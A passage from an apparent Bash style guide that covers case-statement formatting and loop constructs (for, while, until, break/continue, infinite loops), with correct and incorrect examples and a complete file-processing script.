  *)    die 1 'Unknown type' ;;
esac

# ✗ Wrong - missing default case
case "$action" in
  start) start_service ;;
  stop)  stop_service ;;
esac
# What if $action is 'restart'? Silent failure!

# ✓ Correct - always include default case
case "$action" in
  start)   start_service ;;
  stop)    stop_service ;;
  restart) restart_service ;;
  *)       die 22 "Invalid action ${action@Q}" ;;
esac

# ✗ Wrong - inconsistent format mixing
case "$opt" in
  -v) VERBOSE=1 ;;
  -o) shift
      OUTPUT=$1
      ;;                 # Inconsistent - mixing compact and expanded
  -h) show_help; exit 0 ;;
esac

# ✓ Correct - consistent compact format
case "$opt" in
  -v) VERBOSE=1 ;;
  -o) shift; OUTPUT=${1:-} ;;
  -h) show_help; exit 0 ;;
esac

# ✗ Wrong - poor column alignment
case $1 in
  -v|--verbose) VERBOSE+=1 ;;
  -n|--dry-run) DRY_RUN=1 ;;
  -f|--force) FORCE=1 ;;        # Alignment is inconsistent
  -h|--help) show_help; exit 0 ;;
esac

# ✓ Correct - consistent column alignment
case $1 in
  -v|--verbose) VERBOSE+=1 ;;
  -n|--dry-run) DRY_RUN=1 ;;
  -f|--force)   FORCE=1 ;;
  -h|--help)    show_help; exit 0 ;;
esac

# ✗ Wrong - not using ;; terminator
case "$value" in
  start) start_service
  stop) stop_service       # Missing ;;
esac

# ✓ Correct - always use ;; terminator
case "$value" in
  start) start_service ;;
  stop)  stop_service ;;
esac

# ✗ Wrong - fall-through patterns (not supported in Bash)
case "$code" in
  200|201|204)
    success='true'       # Bash doesn't fall through!
  300|301|302)
    redirect='true'      # This won't work as intended
    ;;
esac

# ✓ Correct - explicit pattern grouping
case "$code" in
  200|201|204) success='true' ;;
  300|301|302) redirect='true' ;;
esac

# ✗ Wrong - regex patterns (not supported)
case "$input" in
  [0-9]+) echo 'Number' ;;    # Not regex! This matches single digit only
esac

# ✓ Correct - use proper pattern syntax
case "$input" in
  +([0-9])) echo 'Number' ;;  # Requires extglob
esac
# Or use if with regex:
if [[ "$input" =~ ^[0-9]+$ ]]; then
  echo 'Number'
fi

# ✗ Wrong - side effects in patterns
case "$value" in
  $(complex_function)) echo 'Match' ;;  # Function called for every case!
esac

# ✓ Correct - evaluate once before case
result=$(complex_function)
case "$value" in
  "$result") echo 'Match' ;;
esac

# ✗ Wrong - testing multiple variables
case "$var1" in
  value1) case "$var2" in    # Nested case - hard to read
    value2) action ;;
  esac ;;
esac

# ✓ Correct - use if for multiple variable tests
if [[ "$var1" == value1 && "$var2" == value2 ]]; then
  action
fi
```

**Edge cases and advanced patterns:**

**1. Empty string handling:**

```bash
# Empty string is a valid case
case "$value" in
  '')  echo 'Empty string' ;;
  *)   echo "Value: $value" ;;
esac

# Multiple empty possibilities
case "$input" in
  ''|' '|$'\t')
       echo 'Blank or whitespace' ;;
  *)   echo 'Has content' ;;
esac
```

**2. Special characters in patterns:**

```bash
# Quote patterns with special characters
case "$filename" in
  'file (1).txt')      echo 'Match parentheses' ;;
  'file [backup].txt') echo 'Match brackets' ;;
  'file$special.txt')  echo 'Match dollar sign' ;;
  *)                   echo 'Other' ;;
esac

# Wildcards in middle of pattern
case "$path" in
  /usr/*/bin)         echo 'Binary path under /usr' ;;
  /home/*/Documents)  echo 'User documents folder' ;;
esac
```

**3. Numeric patterns (as strings):**

```bash
# Case treats everything as strings
case "$port" in
  80|443)  echo 'Standard web port' ;;
  22)      echo 'SSH port' ;;
  [0-9][0-9][0-9][0-9])
           echo 'Four-digit port' ;;
  *)       echo 'Other port' ;;
esac

# For numeric comparison, use (()) instead
if ((port == 80 || port == 443)); then
  echo 'Standard web port'
fi
```

**4. Extglob patterns:**

```bash
shopt -s extglob

case "$filename" in
  # Zero or one occurrence
  test?(s).txt)
    echo 'test.txt or tests.txt'
    ;;

  # Zero or more occurrences
  file*(backup).txt)
    echo 'file.txt, filebackup.txt, filebackupbackup.txt'
    ;;

  # One or more occurrences
  log+([0-9]).txt)
    echo 'log1.txt, log123.txt, etc.'
    ;;

  # Exactly one of the patterns
  @(README|LICENSE|CHANGELOG))
    echo 'Standard project file'
    ;;

  # Anything except the patterns
  !(*.tmp|*.bak))
    echo 'Not a temp or backup file'
    ;;

  *)
    echo 'Other file'
    ;;
esac
```

**5. Case statement in functions:**

```bash
# Return different values based on case
validate_input() {
  local -- input=$1

  case "$input" in
    [a-z]*)
      info 'Valid lowercase input'
      return 0
      ;;

    [A-Z]*)
      warn 'Input should be lowercase'
      return 1
      ;;

    [0-9]*)
      error 'Input should not start with digit'
      return 2
      ;;

    '')
      error 'Input is empty'
      return 22
      ;;

    *)
      error 'Invalid input format'
      return 1
      ;;
  esac
}

# Use return value
if validate_input "$user_input"; then
  process_input "$user_input"
fi
```

**6. Multi-level case routing:**

```bash
# First level: action
main() {
  local -- action=$1
  shift

  case "$action" in
    user)
      handle_user_commands "$@"
      ;;

    group)
      handle_group_commands "$@"
      ;;

    system)
      handle_system_commands "$@"
      ;;

    *)
      die 22 "Invalid action ${action@Q}"
      ;;
  esac
}

# Second level: subcommand
handle_user_commands() {
  local -- subcommand=$1
  shift

  case "$subcommand" in
    add)    add_user "$@" ;;
    delete) delete_user "$@" ;;
    list)   list_users ;;
    *)      die 22 "Invalid user subcommand ${subcommand@Q}" ;;
  esac
}

handle_group_commands() {
  local -- subcommand=$1
  shift

  case "$subcommand" in
    add)    add_group "$@" ;;
    delete) delete_group "$@" ;;
    list)   list_groups ;;
    *)      die 22 "Invalid group subcommand ${subcommand@Q}" ;;
  esac
}
```

**Summary:**

- **Use case for pattern matching** - testing single variable against multiple patterns
- **Compact format** - single-line actions with aligned `;;`
- **Expanded format** - multi-line actions with `;;` on separate line
- **Always quote test variable** - `case "$var" in` not `case $var in`
- **Don't quote literal patterns** - `start)` not `"start")`
- **Include default case** - always have `*)` to handle unexpected values
- **Use alternation** - `pattern1|pattern2|pattern3)` for multiple matches
- **Leverage wildcards** - `*.txt)` for glob patterns
- **Enable extglob** - for advanced pattern matching `@(pattern)`, `!(pattern)`
- **Align consistently** - choose compact or expanded, align actions at same column
- **Prefer case over if/elif** - for single-variable multi-value tests
- **Use if for complex logic** - multiple variables, ranges, complex conditions
- **Terminate with ;;** - every case branch needs `;;`

**Key principle:** Case statements excel at routing based on pattern matching of a single value. They're more readable, maintainable, and efficient than long if/elif chains for this purpose. Choose compact format for simple flag setting (argument parsing), expanded format for complex multi-line logic. Always include a default `*)` case to handle unexpected values explicitly. The visual alignment and pattern syntax make case statements self-documenting and easy to modify.


---


**Rule: BCS0503**

## Loops

**Use loops to iterate over collections, process command output, or repeat operations. Bash provides `for`, `while`, and `until` loops, each suited to different iteration patterns. Always prefer array iteration over string parsing, use process substitution to avoid subshell issues, and employ proper loop control with `break` and `continue` for early exits and conditional skipping.**

**Rationale:**

- **Collection Processing**: For loops efficiently iterate over arrays, globs, and ranges
- **Stream Processing**: While loops process line-by-line input from commands or files
- **Condition Looping**: While/until loops continue until condition changes
- **Array Safety**: Iterating arrays with `"${array[@]}"` preserves element boundaries
- **Process Substitution**: Using `< <(command)` avoids subshell variable scope issues
- **Loop Control**: Break and continue enable early exit and conditional processing
- **Readability**: Appropriate loop type makes intent immediately clear

**For loops - Array iteration:**

The most common and safest loop pattern in Bash.

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Iterate over array elements
process_files() {
  local -a files=(
    document.txt
    'file with spaces.pdf'
    'report (final).doc'
  )

  local -- file
  for file in "${files[@]}"; do
    if [[ -f "$file" ]]; then
      info "Processing ${file@Q}"
      # Process file
    else
      warn "File not found ${file@Q}"
    fi
  done
}

# ✓ CORRECT - Iterate with index and value
process_indexed() {
  local -a items=('alpha' 'beta' 'gamma' 'delta')
  local -i index
  local -- item

  for index in "${!items[@]}"; do
    item="${items[$index]}"
    info "Item $index: $item"
  done
}

# ✓ CORRECT - Iterate over arguments
process_arguments() {
  local -- arg

  for arg in "$@"; do
    info "Argument: $arg"
  done
}

main() {
  process_files
  process_indexed
  process_arguments 'arg1' 'arg with spaces' 'arg3'
}

main "$@"

#fin
```

**For loops - Glob patterns:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Iterate over glob matches
process_text_files() {
  local -- file

  # nullglob ensures empty loop if no matches
  for file in "$SCRIPT_DIR"/*.txt; do
    info "Processing text file ${file@Q}"
    # Process file
  done
}

# ✓ CORRECT - Multiple glob patterns
process_documents() {
  local -- file

  for file in "$SCRIPT_DIR"/*.{txt,md,rst}; do
    if [[ -f "$file" ]]; then
      info "Processing document ${file@Q}"
      # Process file
    fi
  done
}

# ✓ CORRECT - Recursive glob (requires globstar)
process_all_scripts() {
  shopt -s globstar

  local -- script

  for script in "$SCRIPT_DIR"/**/*.sh; do
    if [[ -f "$script" ]]; then
      info "Found script ${script@Q}"
      shellcheck "$script"
    fi
  done
}

# ✓ CORRECT - Check if glob matched anything
process_with_check() {
  local -a matches=("$SCRIPT_DIR"/*.log)

  if [[ ${#matches[@]} -eq 0 ]]; then
    warn 'No log files found'
    return 1
  fi

  local -- file
  for file in "${matches[@]}"; do
    info "Processing log ${file@Q}"
  done
}

main() {
  process_text_files
  process_documents
  process_all_scripts
  process_with_check
}

main "$@"
#fin
```

**For loops - C-style:**

Use for numeric iteration with known range.

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - C-style for loop
count_to_ten() {
  local -i i

  for ((i=1; i<=10; i+=1)); do
    echo "Count: $i"
  done
}

# ✓ CORRECT - Iterate with step
count_by_twos() {
  local -i i

  for ((i=0; i<=20; i+=2)); do
    echo "Even: $i"
  done
}

# ✓ CORRECT - Countdown
countdown() {
  local -i seconds=${1:-10}
  local -i i

  for ((i=seconds; i>0; i-=1)); do
    echo "T-minus $i seconds..."
    sleep 1
  done

  echo 'Liftoff!'
}

# ✓ CORRECT - Array processing with index
process_with_index() {
  local -a items=('first' 'second' 'third' 'fourth')
  local -i i

  for ((i=0; i<${#items[@]}; i+=1)); do
    echo "Index $i: ${items[$i]}"
  done
}

main() {
  count_to_ten
  count_by_twos
  countdown 5
  process_with_index
}

main "$@"
#fin
```

**For loops - Brace expansion and sequences:**

```bash
# Range expansion (Bash 4+)
for i in {1..10}; do
  echo "Number: $i"
done

# Range with step (Bash 4+)
for i in {0..100..10}; do
  echo "Multiple of 10: $i"
done

# Character range
for letter in {a..z}; do
  echo "Letter: $letter"
done

# Brace expansion with strings
for env in {dev,staging,prod}; do
  echo "Deploy to: $env"
done

# Zero-padded numbers
for file in file{001..100}.txt; do
  echo "Filename: $file"
done
```

**While loops - Reading input:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Read file line by line
read_file() {
  local -- file=$1
  local -- line
  local -i line_count=0

  while IFS= read -r line; do
    line_count+=1
    echo "Line $line_count: $line"
  done < "$file"

  info "Total lines: $line_count"
}

# ✓ CORRECT - Process command output (avoid subshell)
process_command_output() {
  local -- line
  local -i count=0

  while IFS= read -r line; do
    count+=1
    info "Processing: $line"
  done < <(find "$SCRIPT_DIR" -name '*.txt' -type f)

  info "Processed $count files"
}

# ✓ CORRECT - Read null-delimited input
process_null_delimited() {
  local -- file

  while IFS= read -r -d '' file; do
    info "Processing: $file"
  done < <(find "$SCRIPT_DIR" -name '*.sh' -type f -print0)
}

# ✓ CORRECT - Read CSV with custom delimiter
read_csv() {
  local -- csv_file=$1
  local -- name email age

  while IFS=',' read -r name email age; do
    info "Name: $name, Email: $email, Age: $age"
  done < "$csv_file"
}

# ✓ CORRECT - Read with timeout
read_with_timeout() {
  local -- input

  info 'Enter your name (10 second timeout):'

  if read -r -t 10 input; then
    success "Hello, $input!"
  else
    warn 'Timed out waiting for input'
    return 1
  fi
}

main() {
  local -- test_file='/tmp/test.txt'
  echo -e "Line 1\nLine 2\nLine 3" > "$test_file"

  read_file "$test_file"
  process_command_output
  process_null_delimited

  rm -f "$test_file"
}

main "$@"
#fin
```

**While loops - Argument parsing:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -- OUTPUT_DIR=''
declare -a INPUT_FILES=()

noarg() {
  if (($# < 2)) || [[ "$2" =~ ^- ]]; then
    die 22 "Option ${1@Q} requires an argument"
  fi
}

# ✓ CORRECT - While loop for argument parsing
main() {
  while (($#)); do
    case $1 in
      -v|--verbose)
        VERBOSE+=1
        ;;

      -n|--dry-run)
        DRY_RUN=1
        ;;

      -o|--output)
        noarg "$@"
        shift
        OUTPUT_DIR=$1
        ;;

      -h|--help)
        show_help
        return 0
        ;;

      --)
        shift
        break
        ;;

      -*)
        die 22 "Invalid option ${1@Q}"
        ;;

      *)
        INPUT_FILES+=("$1")
        ;;
    esac
    shift
  done

  # Collect remaining arguments after --
  INPUT_FILES+=("$@")

  readonly -- VERBOSE DRY_RUN OUTPUT_DIR
  readonly -a INPUT_FILES

  # Validate
  ((${#INPUT_FILES[@]})) || die 22 'No input files specified'

  # Process files
  local -- file
  for file in "${INPUT_FILES[@]}"; do
    ((DRY_RUN)) && info "[DRY-RUN] Would process ${file@Q}" ||:
    ((DRY_RUN)) || info "Processing ${file@Q}"
  done
}

main "$@"
#fin
```

**While loops - Condition-based:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Wait for condition
wait_for_file() {
  local -- file=$1
  local -i timeout=${2:-30}
  local -i elapsed=0

  info "Waiting for file ${file@Q}"

  while [[ ! -f "$file" ]]; do
    if ((elapsed >= timeout)); then
      error "Timeout waiting for file ${file@Q}"
      return 1
    fi

    sleep 1
    elapsed+=1
  done

  success "File appeared after $elapsed seconds"
}

# ✓ CORRECT - Retry with exponential backoff
retry_command() {
  local -i max_attempts=5
  local -i attempt=1
  local -i wait_time=1

  while ((attempt <= max_attempts)); do
    info "Attempt $attempt of $max_attempts"

    if some_command; then
      success 'Command succeeded'
      return 0
    fi

    if ((attempt < max_attempts)); then
      warn "Failed, retrying in $wait_time seconds..."
      sleep "$wait_time"
      wait_time=$((wait_time * 2))  # Exponential backoff
    fi

    attempt+=1
  done

  error 'All retry attempts failed'
  return 1
}

# ✓ CORRECT - Process until resource available
process_queue() {
  local -i max_items=100
  local -i processed=0

  while ((processed < max_items)); do
    if ! get_next_item; then
      info 'Queue empty'
      break
    fi

    process_item
    processed+=1
  done

  info "Processed $processed items"
}

main() {
  wait_for_file '/tmp/ready.txt' 10
  retry_command
  process_queue
}

main "$@"
#fin
```

**Until loops:**

Until loops are less common but useful when the logic reads better as "until condition becomes true."

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Until loop (opposite of while)
wait_for_service() {
  local -- service=$1
  local -i timeout=${2:-60}
  local -i elapsed=0

  info "Waiting for service: $service"

  # Loop UNTIL service is running
  until systemctl is-active --quiet "$service"; do
    if ((elapsed >= timeout)); then
      error "Timeout waiting for service: $service"
      return 1
    fi

    sleep 1
    elapsed+=1
  done

  success "Service started after $elapsed seconds"
}

# ✓ CORRECT - Until condition met
wait_until_ready() {
  local -- status_file=$1
  local -i max_wait=30
  local -i waited=0

  until [[ -f "$status_file" && "$(cat "$status_file")" == 'READY' ]]; do
    if ((waited >= max_wait)); then
      error 'Timeout waiting for ready status'
      return 1
    fi

    sleep 1
    waited+=1
  done

  info 'System ready'
}

# ✗ Generally avoid - while is usually clearer
# This until loop is confusing:
until [[ ! -f "$lock_file" ]]; do
  sleep 1
done

# ✓ Better - equivalent while loop is clearer:
while [[ -f "$lock_file" ]]; do
  sleep 1
done

main() {
  wait_for_service 'nginx' 30
  wait_until_ready '/tmp/status.txt'
}

main "$@"
#fin
```

**Loop control - break and continue:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Early exit with break
find_first_match() {
  local -- pattern=$1
  local -a files=("$SCRIPT_DIR"/*)
  local -- file
  local -- found=''

  for file in "${files[@]}"; do
    if [[ -f "$file" && "$file" =~ $pattern ]]; then
      found="$file"
      info "Found match: $file"
      break  # Stop searching after first match
    fi
  done

  [[ -n "$found" ]] || return 1

  echo "$found"
  return 0
}

# ✓ CORRECT - Skip items with continue
process_valid_files() {
  local -a files=("$@")
  local -- file
  local -i processed=0
  local -i skipped=0

  for file in "${files[@]}"; do
    # Skip non-existent files
    if [[ ! -f "$file" ]]; then
      warn "File not found ${file@Q}"
      skipped+=1
      continue
    fi

    # Skip files we can't read
    if [[ ! -r "$file" ]]; then
      warn "File not readable ${file@Q}"
      skipped+=1
      continue
    fi

    # Skip empty files
    if [[ ! -s "$file" ]]; then
      warn "File is empty ${file@Q}"
      skipped+=1
      continue
    fi

    # Process file
    info "Processing ${file@Q}"
    # ... processing logic ...
    processed+=1
  done

  info "Processed: $processed, Skipped: $skipped"
}

# ✓ CORRECT - Break out of nested loops
find_in_matrix() {
  local -a matrix=(
    'row1col1 row1col2 row1col3'
    'row2col1 row2col2 row2col3'
    'row3col1 target row3col3'
  )

  local -- row col
  local -i found=0

  for row in "${matrix[@]}"; do
    for col in $row; do
      if [[ "$col" == 'target' ]]; then
        info "Found target in row: $row"
        found=1
        break 2  # Break out of both loops
      fi
    done
  done

  ((found))
}

# ✓ CORRECT - Continue in while loop
process_log_file() {
  local -- log_file=$1
  local -- line
  local -i errors=0

  while IFS= read -r line; do
    # Skip empty lines
    [[ -n "$line" ]] || continue
    # Skip comments
    [[ ! "$line" =~ ^# ]] || continue

    # Process error lines
    if [[ "$line" =~ ERROR ]]; then
      error "Error found ${line@Q}"
      errors+=1
    fi
  done < "$log_file"

  info "Found $errors errors"
  return "$errors"
}

main() {
  find_first_match 'test'
  process_valid_files file1.txt file2.txt file3.txt
  find_in_matrix
  process_log_file '/var/log/app.log'
}

main "$@"
#fin
```

**Infinite loops:**

> **Performance Note:** Benchmark testing (Bash 5.2.21, 13th Gen Intel i9-13900HX) demonstrates significant performance differences between infinite loop constructs:
>
> | Construct | 100K iterations | 1M iterations | 5M iterations | 1M with work | Performance |
> |-----------|----------------|---------------|---------------|--------------|-------------|
> | `while ((1))` | 0.091s | 0.885s | 4.270s | 1.432s | **Baseline (fastest)** ⚡ |
> | `while :` | 0.102s | 1.009s | 4.837s | 1.575s | +9-14% slower |
> | `while true` | 0.110s | 1.079s | 5.231s | 1.647s | **+15-22% slower** 🐌 |
>
> **Recommendation:** Use `while ((1))` for optimal performance. Use `while :` for POSIX compatibility. Avoid `while true` due to command execution overhead.
>
> See `/ai/scripts/bcx/docs/BENCHMARK-RESULTS.md` for complete analysis.

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ RECOMMENDED - Infinite loop with break condition (fastest option)
monitor_service() {
  local -- service=$1
  local -i interval=${2:-5}

  info "Monitoring service: $service (interval: ${interval}s)"

  while ((1)); do
    if ! systemctl is-active --quiet "$service"; then
      error "Service $service is down!"
      # Could send alert here
    else
      info "Service $service is running"
    fi

    sleep "$interval"
  done
}

# ✓ RECOMMENDED - Infinite loop with exit condition
daemon_loop() {
  local -- pid_file=/var/run/daemon.pid

  # Create PID file
  echo "$$" > "$pid_file"

  # Cleanup on exit
  trap 'rm -f "$pid_file"' EXIT

  info 'Daemon started'

  while ((1)); do
    # Check if we should stop
    if [[ ! -f "$pid_file" ]]; then
      info 'PID file removed, stopping daemon'
      break
    fi

    # Do work
    process_queue

    # Sleep between iterations
    sleep 1
  done

  info 'Daemon stopped'
}

# ✓ RECOMMENDED - Interactive loop
interactive_menu() {
  local -- choice

  while ((1)); do
    echo ''
    echo 'Menu:'
    echo '  1) Start service'
    echo '  2) Stop service'
    echo '  3) Check status'
    echo '  q) Quit'
    echo ''
    read -r -p 'Choice: ' choice

    case "$choice" in
      1)    start_service ;;
      2)    stop_service ;;
      3)    check_status ;;
      q|Q)  info 'Goodbye!'; break ;;
      *)    warn "Invalid choice ${choice@Q}" ;;
    esac
  done
}

# ✓ ACCEPTABLE - POSIX-compatible infinite loop (for /bin/sh scripts)
posix_daemon() {
  # Use while : when POSIX compatibility is required
  while :; do
    process_item || break
    sleep 1
  done
}

# ✗ AVOID - Slowest option due to command execution overhead
slow_monitor() {
  while true; do  # Not recommended: 15-22% slower than while ((1))
    check_status
    sleep 5
  done
}

main() {
  # monitor_service 'nginx' 10  # Would run forever
  # daemon_loop  # Would run forever
  interactive_menu
}

main "$@"
#fin
```

**Nested loops:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Process matrix data
process_matrix() {
  local -a rows=('row1' 'row2' 'row3')
  local -a cols=('col1' 'col2' 'col3')
  local -- row col

  for row in "${rows[@]}"; do
    for col in "${cols[@]}"; do
      echo "Processing: $row, $col"
    done
  done
}

# ✓ CORRECT - Cross-product iteration
test_combinations() {
  local -a environments=('dev' 'staging' 'prod')
  local -a regions=('us-east' 'us-west' 'eu-west')
  local -- env region

  for env in "${environments[@]}"; do
    for region in "${regions[@]}"; do
      info "Testing: $env in $region"
      # Run tests
    done
  done
}

# ✓ CORRECT - Process directory tree
process_tree() {
  local -- base_dir=$1
  local -a dirs=("$base_dir"/*)
  local -- dir file

  for dir in "${dirs[@]}"; do
    [[ -d "$dir" ]] || continue

    info "Processing directory ${dir@Q}"

    for file in "$dir"/*; do
      if [[ -f "$file" ]]; then
        info "  Processing file ${file@Q}"
      fi
    done
  done
}

main() {
  process_matrix
  test_combinations
  process_tree "$SCRIPT_DIR"
}

main "$@"
#fin
```

**Complete example - File processor with multiple loop types:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Global Variables
# ============================================================================

declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -i MAX_RETRIES=3
declare -- OUTPUT_DIR=''
declare -a INPUT_PATTERNS=()

# ============================================================================
# Messaging Functions
# ============================================================================

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case "${FUNCNAME[1]}" in
    info) prefix+=" ◉" ;;
    warn) prefix+=" ▲" ;;
    error) prefix+=" ✗" ;;
    success) prefix+=" ✓" ;;
    *) ;;
  esac
  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }
success() { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# ============================================================================
# Helper Functions
# ============================================================================

noarg() {
  (($# > 1)) && [[ "${2:0:1}" != '-' ]] || die 22 "Option ${1@Q} requires an argument"
}

# Retry command with backoff
retry_with_backoff() {
  local -i attempt=1
  local -i wait_time=1

  while ((attempt <= MAX_RETRIES)); do
    ((VERBOSE)) && info "Attempt $attempt of $MAX_RETRIES" ||:

    if "$@"; then
      return 0
    fi

    if ((attempt < MAX_RETRIES)); then
      warn "Failed, retrying in $wait_time seconds..."
      sleep "$wait_time"
      wait_time=$((wait_time * 2))
    fi

    attempt+=1
  done

  error "All $MAX_RETRIES attempts failed"
  return 1
}

# ============================================================================
# Business Logic
# ============================================================================

# Process single file with retry logic
process_file() {
  local -- file=$1

  # Validate file
  if [[ ! -f "$file" ]]; then
    error "File not found ${file@Q}"
    return 2
  fi

  if [[ ! -r "$file" ]]; then
    error "File not readable ${file@Q}"
    return 1
  fi

  if [[ ! -s "$file" ]]; then
    warn "File is empty ${file@Q}"
    return 0
  fi

  if ((DRY_RUN)); then
    info "[DRY-RUN] Would process: $file"
    return 0
  fi

  info "Processing: $file"

  # Process file line by line
  local -- line
  local -i line_count=0

  while IFS= read -r line; do
    # Skip empty lines
    [[ -n "$line" ]] || continue

    # Skip comments
    [[ ! "$line" =~ ^# ]] || continue

    line_count+=1
    ((VERBOSE)) && info "  Line $line_count: $line" || :

    # Process line (with retry)
    retry_with_backoff process_line "$line" || {
      error "Failed to process line $line_count in ${file@Q}"
      return 1
    }
  done < "$file"

  success "Processed $line_count lines from ${file@Q}"
  return 0
}

process_line() {
  local -- line=$1
  # Line processing logic here
  sleep 0.1  # Simulate work
}

# Collect files matching patterns
collect_files() {
  local -a files=()
  local -- pattern file

  # Iterate over each pattern
  for pattern in "${INPUT_PATTERNS[@]}"; do
    ((VERBOSE)) && info "Searching for pattern: $pattern" ||:

    # Iterate over glob matches
    for file in $pattern; do
      # Check if glob matched anything
      if [[ ! -e "$file" ]]; then
        ((VERBOSE)) && warn "No matches for pattern: $pattern" ||:
        continue
      fi

      if [[ -f "$file" ]]; then
        files+=("$file")
      fi
    done
  done

  # Check if we found any files
  if ((${#files[@]} == 0)); then
    error 'No files found matching patterns'
    return 1
  fi

  # Return files (print to stdout)
  printf '%s\n' "${files[@]}"
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  # Parse arguments with while loop
  while (($#)); do
    case $1 in
      -v|--verbose)
        VERBOSE+=1
        ;;

      -n|--dry-run)
        DRY_RUN=1
        ;;

      -r|--retries)
        noarg "$@"
        shift
        MAX_RETRIES=$1
        ;;

      -o|--output)
        noarg "$@"
        shift
        OUTPUT_DIR=$1
        ;;

      -h|--help)
        echo "Usage: $SCRIPT_NAME [OPTIONS] PATTERN..."
        echo 'Options:'
        echo '  -v, --verbose    Verbose output'
        echo '  -n, --dry-run    Dry-run mode'
        echo '  -r, --retries N  Max retry attempts'
        echo '  -o, --output DIR Output directory'
        return 0
        ;;

      --)
        shift
        INPUT_PATTERNS+=("$@")
        break
        ;;

      -*)
        die 22 "Invalid option ${1@Q}"
        ;;

      *)
        INPUT_PATTERNS+=("$1")
        ;;
    esac
    shift
  done

  # Collect remaining arguments
  INPUT_PATTERNS+=("$@")

  # Make variables readonly
  readonly -- VERBOSE DRY_RUN MAX_RETRIES OUTPUT_DIR
  readonly -a INPUT_PATTERNS

  # Validate
  if ((${#INPUT_PATTERNS[@]} == 0)); then
    die 22 'No file patterns specified'
  fi

  # Display configuration
  if ((VERBOSE)); then
    info "$SCRIPT_NAME $VERSION"
    info "Patterns: ${INPUT_PATTERNS[*]}"
    info "Max retries: $MAX_RETRIES"
    ((DRY_RUN)) && info '[DRY-RUN] Mode enabled' ||:
  fi

  # Collect matching files
  local -a files
  if ! readarray -t files < <(collect_files); then
    die 1 'Failed to collect files'
  fi

  info "Found ${#files[@]} files to process"

  # Process each file with for loop
  local -- file
  local -i success_count=0
  local -i error_count=0

  for file in "${files[@]}"; do
    if process_file "$file"; then
      success_count+=1
    else
      error_count+=1
    fi
  done

  # Report results
  info "Results: $success_count succeeded, $error_count failed"

  # Return appropriate exit code
  ((error_count == 0))
}

# ============================================================================
# Script Invocation
# ============================================================================

main "$@"
#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - iterating over unquoted string
files_str="file1.txt file2.txt file with spaces.txt"
for file in $files_str; do  # Word splitting!
  echo "$file"
done

# ✓ Correct - iterate over array
files=('file1.txt' 'file2.txt' 'file with spaces.txt')
for file in "${files[@]}"; do
  echo "$file"
done

# ✗ Wrong - parsing ls output
